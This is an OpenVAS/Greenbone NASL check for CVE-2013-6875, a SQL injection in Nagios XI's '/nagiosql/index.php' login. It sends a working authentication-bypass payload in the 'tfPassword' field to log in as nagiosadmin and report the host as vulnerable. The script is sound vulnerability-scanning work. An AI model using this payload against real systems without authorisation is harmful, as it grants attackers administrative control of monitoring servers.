CPE = "cpe:/a:nagios:nagiosxi";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103842" );
	script_bugtraq_id( 63754 );
	script_cve_id( "CVE-2013-6875" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "$Revision: 13659 $" );
	script_name( "Nagios XI 'tfPassword' Parameter SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/63754" );
	script_xref( name: "URL", value: "http://www.nagios.com/products/nagiosxi" );
	script_tag( name: "last_modification", value: "$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $" );
	script_tag( name: "creation_date", value: "2013-12-02 10:28:47 +0100 (Mon, 02 Dec 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_nagios_XI_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "nagiosxi/installed" );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database." );
	script_tag( name: "vuldetect", value: "Try to login as nagiosadmin using SQL injection." );
	script_tag( name: "insight", value: "It's possible to bypass authentication in '/nagiosql/index.php'. By
using 'OpenVAS' as username and '%27)%20OR%201%3D1%20limit%201%3B--%20' as password
it was possible to login as 'nagiosadmin'." );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory
for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Nagios XI is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query." );
	script_tag( name: "affected", value: "Versions prior to Nagios XI 2012R2.4 are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
dir = "/nagiosql";
url = dir + "/index.php";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!ContainsString( buf, "tfPassword" )){
	exit( 0 );
}
cookie = eregmatch( pattern: "Set-Cookie: ([^\r\n]+)", string: buf );
if(isnull( cookie[1] )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
co = cookie[1];
bypass = "tfUsername=OpenVAS&tfPassword=%27)%20OR%201%3D1%20limit%201%3B--%20&Submit=Login";
len = strlen( bypass );
req = "POST " + dir + "/index.php HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "Content-Length: " + len + "\r\n" + "Origin: http://" + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" + "Referer: http://" + host + dir + "\r\n" + "Cookie: " + co + "\r\n" + "\r\n" + bypass;
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!IsMatchRegexp( result, "HTTP/1.. 302" )){
	exit( 0 );
}
req = "GET " + dir + "/admin.php HTTP/1.1\r\n" + "Host: " + host + "\r\n" + "User-Agent: " + useragent + "\r\n" + "Referer: http://" + host + dir + "\r\n" + "Cookie: " + co + "\r\n" + "\r\n";
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( buf, "HTTP/1.. 200" ) && ContainsString( buf, "Core Config Manager" ) && ContainsString( buf, "nagiosadmin" ) && ContainsString( buf, ">Logout<" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

